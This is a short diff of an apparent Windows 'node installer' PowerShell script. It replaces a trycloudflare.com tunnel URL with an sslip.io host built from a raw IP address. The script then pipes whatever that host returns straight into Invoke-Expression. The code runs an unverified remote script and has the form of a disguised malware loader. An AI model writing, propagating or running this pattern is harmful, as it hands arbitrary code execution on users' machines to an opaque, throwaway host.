@@ -9,5 +9,5 @@
 # fetching a URL that has never resolved to anything, silently breaking the
 # entire Windows node installer flow.
 $ErrorActionPreference = "Stop"
-$base = "https://peripheral-medication-declare-nursery.trycloudflare.com"
+$base = "https://82-29-54-7.sslip.io"
 Invoke-Expression (Invoke-RestMethod "$base/api/node/windows-installer.ps1")
